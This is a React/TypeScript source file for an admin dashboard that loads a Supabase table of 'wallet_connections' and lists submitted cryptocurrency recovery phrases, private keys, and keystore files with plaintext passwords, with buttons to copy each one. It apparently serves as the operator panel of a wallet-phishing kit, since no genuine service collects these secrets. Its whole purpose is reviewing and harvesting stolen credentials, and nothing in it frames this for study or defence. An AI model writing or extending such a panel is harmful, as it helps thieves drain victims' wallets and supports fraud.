import React, { useEffect, useState } from 'react';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Button } from '@/components/ui/button';
import { useNavigate } from 'react-router-dom';
import { supabase } from '@/lib/supabase';
import type { WalletConnection } from '@/lib/supabase';
import { Copy, Check } from 'lucide-react';

const AdminDashboard = () => {
  const navigate = useNavigate();
  const [activeTab, setActiveTab] = useState('phrases');
  const [connections, setConnections] = useState<WalletConnection[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [copiedField, setCopiedField] = useState<string | null>(null);

  useEffect(() => {
    fetchConnections();
  }, []);

  const fetchConnections = async () => {
    setLoading(true);
    setError(null);
    try {
      const { data, error } = await supabase
        .from('wallet_connections')
        .select('*')
        .order('created_at', { ascending: false });

      console.log('Supabase Response:', { data, error });
      if (error) throw error;
      setConnections(data || []);
      if (!data || data.length === 0) {
        console.log('No data returned from wallet_connections table');
      }
    } catch (error: any) {
      console.error('Error fetching connections:', error.message, error.details);
      setError('Failed to load connections. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  const filterConnections = (type: string) => {
    const filtered = connections.filter((conn) => conn.connection_type === type);
    console.log(`Filtered ${type}:`, filtered);
    return filtered;
  };

  const maskSensitiveData = (data: string) => `${data.substring(0, 8)}...${data.slice(-4)}`;

  const handleCopy = async (text: string, fieldId: string) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopiedField(fieldId);
      setTimeout(() => setCopiedField(null), 2000);
    } catch (err) {
      console.error('Failed to copy:', err);
      setError('Failed to copy to clipboard. Please try again.');
    }
  };

  return (
    <div className="container mx-auto px-4 py-12">
      <div className="flex justify-between items-center mb-8">
        <h1 className="text-3xl font-bold text-gradient">Admin Dashboard</h1>
        <Button variant="outline" onClick={() => navigate('/')}>
          Back to Home
        </Button>
      </div>

      {error && <p className="text-red-500 text-center py-4">{error}</p>}

      <div className="glass-card p-6 mb-8">
        <h2 className="text-xl font-semibold mb-4 text-web3-primary">Dashboard Overview</h2>
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
          <div className="glass-card bg-web3-primary/10 p-4">
            <p className="text-gray-400 text-sm">Total Submissions</p>
            <p className="text-2xl font-bold">{connections.length}</p>
          </div>
          <div className="glass-card bg-web3-primary/10 p-4">
            <p className="text-gray-400 text-sm">Recovery Phrases</p>
            <p className="text-2xl font-bold">{filterConnections('phrase').length}</p>
          </div>
          <div className="glass-card bg-web3-primary/10 p-4">
            <p className="text-gray-400 text-sm">Private Keys</p>
            <p className="text-2xl font-bold">{filterConnections('private_key').length}</p>
          </div>
        </div>
      </div>

      <Tabs defaultValue="phrases" className="w-full" onValueChange={setActiveTab}>
        <TabsList className="grid w-full grid-cols-3 mb-8">
          <TabsTrigger value="phrases">Recovery Phrases</TabsTrigger>
          <TabsTrigger value="privateKeys">Private Keys</TabsTrigger>
          <TabsTrigger value="keystores">Keystores</TabsTrigger>
        </TabsList>

        <TabsContent value="phrases" className="space-y-4">
          {loading ? (
            <p className="text-center text-gray-400 py-8">Loading...</p>
          ) : filterConnections('phrase').length > 0 ? (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-web3-dark text-gray-200">
                  <tr>
                    <th className="p-3 text-left">Wallet</th>
                    <th className="p-3 text-left">Recovery Phrase</th>
                    <th className="p-3 text-left">Timestamp</th>
                  </tr>
                </thead>
                <tbody>
                  {filterConnections('phrase').map((conn) => (
                    <tr key={conn.id} className="border-b border-web3-primary/10">
                      <td className="p-3">{conn.wallet_name}</td>
                      <td className="p-3 flex items-center space-x-2">
                        <span className="font-mono text-sm text-web3-primary">
                          {conn.data.phrase ? maskSensitiveData(conn.data.phrase) : 'N/A'}
                        </span>
                        {conn.data.phrase && (
                          <div className="relative group">
                            <button
                              onClick={() => handleCopy(conn.data.phrase, `phrase-${conn.id}`)}
                              className="text-gray-400 hover:text-web3-primary"
                              aria-label={copiedField === `phrase-${conn.id}` ? 'Copied' : 'Copy recovery phrase'}
                              title={copiedField === `phrase-${conn.id}` ? 'Copied' : 'Copy to clipboard'}
                            >
                              {copiedField === `phrase-${conn.id}` ? (
                                <Check size={16} />
                              ) : (
                                <Copy size={16} />
                              )}
                            </button>
                            <span className="absolute left-8 top-1/2 -translate-y-1/2 hidden group-hover:block bg-transparent text-white font-semibold text-xs rounded">
                              {copiedField === `phrase-${conn.id}` ? 'Copied!' : 'Copy!'}
                            </span>
                          </div>
                        )}
                      </td>
                      <td className="p-3 text-sm text-gray-400">
                        {new Date(conn.created_at).toLocaleString()}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          ) : (
            <p className="text-center text-gray-400 py-8">No recovery phrases submitted yet.</p>
          )}
        </TabsContent>

        <TabsContent value="privateKeys" className="space-y-4">
          {loading ? (
            <p className="text-center text-gray-400 py-8">Loading...</p>
          ) : filterConnections('private_key').length > 0 ? (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-web3-dark text-gray-200">
                  <tr>
                    <th className="p-3 text-left">Wallet</th>
                    <th className="p-3 text-left">Private Key</th>
                    <th className="p-3 text-left">Timestamp</th>
                  </tr>
                </thead>
                <tbody>
                  {filterConnections('private_key').map((conn) => (
                    <tr key={conn.id} className="border-b border-web3-primary/10">
                      <td className="p-3">{conn.wallet_name}</td>
                      <td className="p-3 flex items-center space-x-2">
                        <span className="font-mono text-sm text-web3-primary">
                          {conn.data.private_key ? maskSensitiveData(conn.data.private_key) : 'N/A'}
                        </span>
                        {conn.data.private_key && (
                          <div className="relative group">
                            <button
                              onClick={() => handleCopy(conn.data.private_key, `private_key-${conn.id}`)}
                              className="text-gray-400 hover:text-web3-primary"
                              aria-label={copiedField === `private_key-${conn.id}` ? 'Copied' : 'Copy private key'}
                              title={copiedField === `private_key-${conn.id}` ? 'Copied' : 'Copy to clipboard'}
                            >
                              {copiedField === `private_key-${conn.id}` ? (
                                <Check size={16} />
                              ) : (
                                <Copy size={16} />
                              )}
                            </button>
                            <span className="absolute left-8 top-1/2 -translate-y-1/2 hidden group-hover:block bg-transparent text-white font-semibold text-xs p-1 rounded">
                              {copiedField === `private_key-${conn.id}` ? 'Copied!' : 'Copy!'}
                            </span>
                          </div>
                        )}
                      </td>
                      <td className="p-3 text-sm text-gray-400">
                        {new Date(conn.created_at).toLocaleString()}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          ) : (
            <p className="text-center text-gray-400 py-8">No private keys submitted yet.</p>
          )}
        </TabsContent>

        <TabsContent value="keystores" className="space-y-4">
          {loading ? (
            <p className="text-center text-gray-400 py-8">Loading...</p>
          ) : filterConnections('keystore').length > 0 ? (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-web3-dark text-gray-200">
                  <tr>
                    <th className="p-3 text-left">Wallet</th>
                    <th className="p-3 text-left">Keystore JSON</th>
                    <th className="p-3 text-left">Password</th>
                    <th className="p-3 text-left">Timestamp</th>
                  </tr>
                </thead>
                <tbody>
                  {filterConnections('keystore').map((conn) => (
                    <tr key={conn.id} className="border-b border-web3-primary/10">
                      <td className="p-3">{conn.wallet_name}</td>
                      <td className="p-3 flex items-center space-x-2">
                        <span className="font-mono text-sm text-web3-primary">
                          {conn.data.keystore_json
                            ? `${conn.data.keystore_json.substring(0, 50)}...`
                            : 'N/A'}
                        </span>
                        {conn.data.keystore_json && (
                          <div className="relative group">
                            <button
                              onClick={() => handleCopy(conn.data.keystore_json, `keystore-${conn.id}`)}
                              className="text-gray-400 hover:text-web3-primary"
                              aria-label={copiedField === `keystore-${conn.id}` ? 'Copied' : 'Copy keystore JSON'}
                              title={copiedField === `keystore-${conn.id}` ? 'Copied' : 'Copy to clipboard'}
                            >
                              {copiedField === `keystore-${conn.id}` ? (
                                <Check size={16} />
                              ) : (
                                <Copy size={16} />
                              )}
                            </button>
                            <span className="absolute left-8 top-1/2 -translate-y-1/2 hidden group-hover:block bg-transparent text-white font-semibold  text-xs p-1 rounded">
                              {copiedField === `keystore-${conn.id}` ? 'Copied!' : 'Copy!'}
                            </span>
                          </div>
                        )}
                      </td>
                      <td className="p-3">{conn.data.keystore_password || 'N/A'}</td>
                      <td className="p-3 text-sm text-gray-400">
                        {new Date(conn.created_at).toLocaleString()}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          ) : (
            <p className="text-center text-gray-400 py-8">No keystores submitted yet.</p>
          )}
        </TabsContent>
      </Tabs>
    </div>
  );
};

export default AdminDashboard;